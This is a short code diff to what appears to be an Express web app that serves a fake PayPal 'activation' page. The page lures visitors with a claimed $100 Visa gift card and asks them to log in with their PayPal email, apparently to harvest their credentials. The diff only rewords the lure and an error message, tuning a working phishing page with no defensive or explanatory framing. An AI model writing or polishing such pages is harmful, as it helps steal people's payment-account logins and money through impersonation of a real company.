@@ -113,7 +113,7 @@ app.get('/activate.html', (req, res) => {
     <div class="container">
         <div class="logo">PayPal</div>
         <div id="cardDisplayActivate"></div>
-        <p class="gift-text">You were gifted a $100 Visa. Login with PayPal to activate</p>
+        <p class="gift-text">You were gifted a $100 Visa card, Login with PayPal to activate</p>
         <div id="cardDetails"></div>
         <div id="errorMessage" class="error-message"></div>
         <input type="text" class="input-field" id="activateUsername" placeholder="PayPal Email">
@@ -205,7 +205,7 @@ app.get('/activate.html', (req, res) => {
                 else { showError(data.error || 'Activation unavailable'); }
             } catch (error) {
                 console.error('Activation error:', error);
-                showError('Network issue or backend unavailable. Please try again.');
+                showError('Network issue. Please try again.');
             } finally { hideLoader(); }
         }
 
